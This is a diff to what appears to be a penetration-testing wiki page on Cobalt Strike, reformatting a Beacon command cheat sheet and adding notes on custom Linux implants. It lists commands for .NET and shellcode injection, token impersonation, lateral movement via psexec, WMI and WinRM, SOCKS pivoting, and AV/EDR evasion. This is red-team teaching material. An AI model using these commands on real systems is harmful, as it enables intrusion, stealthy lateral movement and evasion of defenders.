@@ -36,7 +36,11 @@ If you already has the file you want to host in a web sever just go to `Attacks 
 
 ### Beacon Options
 
-<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
+<details>
+**Beacon options and commands**
+
+```bash
+# Execute local .NET binary
 execute-assembly </path/to/executable.exe>
 # Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.
 
@@ -62,6 +66,7 @@ powershell <just write powershell cmd here> # This uses the highest supported po
 powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
 powerpick Invoke-PrivescAudit | fl
 psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.
+
 
 # User impersonation
 ## Token generation with creds
@@ -139,6 +144,7 @@ jump [method] [target] [listener]
 ## winrm64                   x64   Run a PowerShell script via WinRM
 ## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)
 
+
 remote-exec [method] [target] [command] # remote-exec doesn't return output
 ## Methods:
 ## psexec                          Remote execute via Service Control Manager
@@ -148,6 +154,7 @@ remote-exec [method] [target] [command] # remote-exec doesn't return output
 ## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
+
 
 # Pass session to Metasploit - Through listener
 ## On metaploit host
@@ -174,12 +181,24 @@ shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 pro
 ## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
 ## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
 
+
 # Pivoting
 ## Open a socks proxy in the teamserver
 beacon> socks 1080
 
 # SSH connection
-beacon> ssh 10.10.17.12:22 username password</code></pre>
+beacon> ssh 10.10.17.12:22 username password
+```
+
+</details>
+
+### Custom implants / Linux Beacons
+
+- A custom agent only needs to speak the Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) to register/check-in and receive tasks. Implement the same URIs/headers/metadata crypto defined in the profile to reuse the Cobalt Strike UI for tasking and output.
+- An Aggressor Script (e.g., `CustomBeacon.cna`) can wrap payload generation for the non-Windows beacon so operators can select the listener and produce ELF payloads directly from the GUI.
+- Example Linux task handlers exposed to the Team Server: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, and `exit`. These map to task IDs expected by the Team Server and must be implemented server-side to return output in the proper format.
+- BOF support on Linux can be added by loading Beacon Object Files in-process with [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supports Outflank-style BOFs too), allowing modular post-exploitation to run inside the implant's context/privileges without spawning new processes.
+- Embed a SOCKS handler in the custom beacon to keep pivoting parity with Windows Beacons: when the operator runs `socks <port>` the implant should open a local proxy to route operator tooling through the compromised Linux host into internal networks.
 
 ## Opsec
 
@@ -190,7 +209,6 @@ The **`execute-assembly`** uses a **sacrificial process** using remote process i
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 - In Cobalt Strike you can also use BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
-- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 
 The agressor script `https://github.com/outflanknl/HelpColor` will create the `helpx` command in Cobalt Strike which will put colors in commands indicating if they are BOFs (green), if they are Frok&Run (yellow) and similar, or if they are ProcessExecution, injection or similar (red). Which helps to know which commands are more stealthy.
 
@@ -286,19 +304,13 @@ Moreover, sometimes to do a pass-the.hash or pass-the-ticket attack it's stealth
 
 However, you need to be **careful with the generated traffic**, as you might be sending uncommon traffic (kerberos?) from your backdoor process. For this you could pivot to a browser process (although you could get caught injecting yourself into a process so think about a stealth way to do this).
 
-```bash
-
 ### Avoiding AVs
 
 #### AV/AMSI/ETW Bypass
 
 Check the page:
 
-
-{{#ref}}
-av-bypass.md
-{{#endref}}
-
+[[av-bypass.md]]
 
 #### Artifact Kit
 
@@ -340,14 +352,16 @@ Some option granted by Cobalt Strike to bypass function hooks is to remove those
 
 You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)
 
-
-
+<details>
+**Misc Cobalt Strike commands**
 
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
 http://localhost:7474/ --> Change password
 execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL
+
+
 
 # Change powershell
 C:\Tools\cobaltstrike\ResourceKit
@@ -360,5 +374,18 @@ cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\Resou
 cd  C:\Tools\cobaltstrike\ArtifactKit
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 
+
 ```
+
+</details>
+
+## References
+
+- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
+- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
+- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
+- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
+- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
+- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
+- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
 
